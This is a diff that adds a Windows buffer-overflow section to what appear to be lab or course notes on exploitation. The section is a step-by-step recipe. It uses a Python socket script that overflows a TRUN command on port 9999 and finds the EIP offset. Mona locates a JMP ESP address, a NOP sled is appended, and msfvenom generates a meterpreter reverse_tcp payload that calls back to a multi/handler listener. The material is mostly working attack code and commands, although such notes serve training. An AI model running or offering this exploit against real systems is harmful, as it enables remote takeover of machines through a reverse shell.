@@ -407,6 +407,60 @@ print(buffer + eip + nop + buf)
 22. On linops run the func executable using the script as userinput
   sudo ./func <<< $(python lin_buf.py)
 
+--- WINDOWS ---
+1. run the program
+2. open the program in Immunity Debugger ensure the program in paused
+3. create a script called win_buf.py
+############# Starting Script
+<
+import socket
+
+buf = "TRUN /.:/"
+buf += "A" * 5000   # 5000 Characters from pattern generator
+
+s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)  # IPv4 socket, TCP Protocol
+s.connect(("10.50.37.177", 9999))   # Target IP and port
+print s.recv(1024)
+s.send(buf)   #Send the value of buf
+print s.recv(1024)
+s.close()
+>
+4. Go to wiremask and get a 5000 character string and paste it into the script
+5. start running your script and then then unpause immunity debugger
+6. copy the EIP
+  ex-> 386F4337
+7. paste into wiremask and get offset value
+  ex-> 2003
+8. delete long character line and replace the value 5000 with the offset value
+  ex-> buf += "A" * 2003
+9. close out of immunity debugger and re run it
+10. re-run and re-attach program to immunity debugger
+11. make sure the program is paused
+12. at the bottom of immunity debugger run this command
+  !mona jmp -r esp -m "essfunc.dll"
+13. right click one of the pointer and copy the address to your clipboard
+  ex-> 0BADF00D
+14. adjust your script by adding that address backwards and the nop sled
+  ex-> buf += "\x0d\xf0\xad\x0b"
+  ex-> buf += "\x90" * 10
+15. Generate a malicious payload using msfvenom and msfconsole
+  msfconsole
+    msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.22.28 lport=4444 -b "\x00" -f python
+16. copy the payload, except for the first line and paste it into the script 
+  ex-> bug = b""    # DO NOT COPY THIS LINE
+17. msfconsole
+  use multi/handler
+    show options
+  set payload windows/meterpreter/reverse_tcp
+    show options
+  set LHOST 10.50.22.28
+    show options 
+18. run secureserver then type exploit in msfconsole and then run your script
+
+
+
+
+
 #############################################
 Post exploitation :: Local Host Enumeration
 #############################################
